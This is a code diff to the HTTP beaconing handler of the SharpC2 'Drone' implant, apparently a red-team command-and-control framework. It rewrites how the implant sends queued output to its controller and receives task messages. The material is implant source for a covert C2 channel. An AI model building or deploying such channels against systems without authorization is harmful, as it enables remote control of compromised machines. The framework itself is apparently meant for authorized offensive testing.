@@ -1,6 +1,5 @@
 ﻿using System;
-using System.Net.Http;
-using System.Text;
+using System.Net;
 using System.Threading.Tasks;
 
 using Drone.Models;
@@ -11,19 +10,19 @@ namespace Drone.Handlers
     {
         public override string Name { get; } = "default-http";
 
-        private HttpClient _client;
+        private WebClient _client;
         private bool _running;
 
         public override void Init(DroneConfig config, Metadata metadata)
         {
             base.Init(config, metadata);
 
-            _client = new HttpClient {BaseAddress = new Uri($"{HttpScheme}://{ConnectAddress}:{ConnectPort}")};
-            _client.DefaultRequestHeaders.Clear();
+            _client = new WebClient {BaseAddress = $"{HttpScheme}://{ConnectAddress}:{ConnectPort}"};
+            _client.Headers.Clear();
 
             var encodedMetadata = Convert.ToBase64String(Metadata.Serialize());
-            _client.DefaultRequestHeaders.Add("X-Malware", "SharpC2");
-            _client.DefaultRequestHeaders.Add("Authorization", $"Bearer {encodedMetadata}");
+            _client.Headers.Add("X-Malware", "SharpC2");
+            _client.Headers.Add("Authorization", $"Bearer {encodedMetadata}");
         }
 
         public override async Task Start()
@@ -48,26 +47,24 @@ namespace Drone.Handlers
 
         private async Task SendGet()
         {
-            var response = await _client.GetAsync("/");
-            await HandleResponse(response);
+            var response = await _client.DownloadDataTaskAsync("/");
+            
+            HandleResponse(response);
         }
 
         private async Task SendPost()
         {
             var data = GetOutboundQueue().Serialize();
-            var content = new StringContent(Encoding.UTF8.GetString(data), Encoding.UTF8, "application/json");
-            var response = await _client.PostAsync("/", content);
-            await HandleResponse(response);
+            var response = await _client.UploadDataTaskAsync("/", data);
+            
+            HandleResponse(response);
         }
 
-        private async Task HandleResponse(HttpResponseMessage response)
+        private void HandleResponse(byte[] response)
         {
-            if (!response.IsSuccessStatusCode) return;
+            if (response.Length == 0) return;
 
-            var data = await response.Content.ReadAsByteArrayAsync();
-            if (data.Length == 0) return;
-
-            var envelope = data.Deserialize<C2Message>();
+            var envelope = response.Deserialize<C2Message>();
             if (envelope is null) return;
 
             InboundQueue.Enqueue(envelope);
